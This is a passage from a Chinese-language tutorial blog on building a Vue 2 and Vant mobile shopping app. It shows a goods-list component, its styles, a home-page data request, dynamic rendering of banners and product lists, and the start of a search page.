style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tit text-ellipsis-2"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        三星手机 SAMSUNG Galaxy S23 8GB+256GB 超视觉夜拍系统 超清夜景 悠雾紫</span></span><span class="line"><span style="color: #D4D4D4">        5G手机 游戏拍照旗舰机s23</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"count"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">已售104件</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"price"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"new"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">¥3999.00</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"old"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">¥6699.00</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.goods-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">148px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">6px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">127px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.right</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1.3</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex-direction</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">column</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-evenly</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.count</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#999</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.price</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#999</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.new</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#f03c3c</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.old</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">text-decoration</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">line-through</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h3 id="首页-动态渲染"><a class="markdownIt-Anchor" href="#首页-动态渲染"></a> 首页 - 动态渲染</h3><p>根据接口文档封装请求首页数据模块于 api 包下，新建 home.js：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/utils/request"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 获取首页数据</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getHomeData</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">request</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/page/detail"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">params:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">pageId:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>接着转到 layout 的 home.vue 处理动态渲染：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">GoodsItem</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/components/GoodsItem.vue"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">getHomeData</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/api/home"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"HomePage"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">components:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">GoodsItem</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">bannerList:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">navList:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">prodsList:</span><span style="color: #D4D4D4"> [],</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">: { </span><span style="color: #4FC1FF">pageData</span><span style="color: #D4D4D4"> },</span></span><span class="line"><span style="color: #D4D4D4">    } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getHomeData</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">pageData</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">bannerList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">pageData</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">items</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">].</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 获取轮播图数据</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">navList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">pageData</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">items</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">3</span><span style="color: #D4D4D4">].</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 获取导航组数据</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">prodsList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">pageData</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">items</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">6</span><span style="color: #D4D4D4">].</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 获取商品组数据</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>改造 template 中轮播图和导航部分：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">&lt;!-- 轮播图 --&gt;</span></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-swipe</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"my-swipe"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">autoplay</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #B5CEA8">3000</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">indicator-color</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"white"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;van-swipe-item v-for="item in bannerList" :key="item.imgUrl"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;img :src="item.imgUrl" alt=""&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;/van-swipe-item&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-swipe</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">&lt;!-- 导航 --&gt;</span></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-grid</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">column-num</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"5"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">icon-size</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"40"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;van-grid-item</span></span><span class="line"><span style="color: #D4D4D4">        v-for="item in navList" :key="item.imgUrl"</span></span><span class="line"><span style="color: #D4D4D4">        :icon="item.imgUrl"</span></span><span class="line"><span style="color: #D4D4D4">        :text="item.text"</span></span><span class="line"><span style="color: #D4D4D4">        @click="$router.push('/category')"</span></span><span class="line"><span style="color: #D4D4D4">      /&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-grid</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>接着改造商品组：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">&lt;!-- 猜你喜欢 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"guess"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;p class="guess-title"&gt;—— 猜你喜欢 ——&lt;/p&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;div class="goods-list"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;GoodsItem v-for="item in prodsList" :key="item.goods_id" :goods="item"&gt;&lt;/GoodsItem&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #D4D4D4">/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>父传子将 item 整个对象传给 GoodsItem 进行接收：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'GoodsItem'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">props:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">goods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Object</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">default</span><span style="color: #9CDCFE">:</span><span style="color: #D4D4D4"> () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {}</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span></code></pre></div></div></figure><p>然后改造 template</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goods-item"</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">goods</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">  @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">`/prodetail/</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">goods</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_id</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    &lt;div class="left"&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;img :src="goods.goods_image" alt="" /&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;p class="tit text-ellipsis-2"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        {{ goods.goods_name }}</span></span><span class="line"><span style="color: #D4D4D4">      &lt;/p&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;p class="count"&gt;{{goods.goods_sales}}&lt;/p&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;p class="price"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;span class="new"&gt;{{goods.goods_price_min}}&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;span class="old"&gt;{{goods.goods_price_max}}&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;/p&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>注意将商品 id 携带进行跳转时要动态取值使用反引号。</p><h2 id="搜索"><a class="markdownIt-Anchor" href="#搜索"></a> 搜索</h2><p>页面设计：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408292021783.png" alt="image-20230621144449700"></p><h3 id="搜索页静态结构"><a class="markdownIt-Anchor" href="#搜索页静态结构"></a> 搜索页静态结构</h3><p><code>view/search/index.vue</code>（需要导入 vant 组件 Icon）</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"search"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"商品搜索"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">left-arrow</span><span style="color: #D4D4D4"> @</span><span style="color: 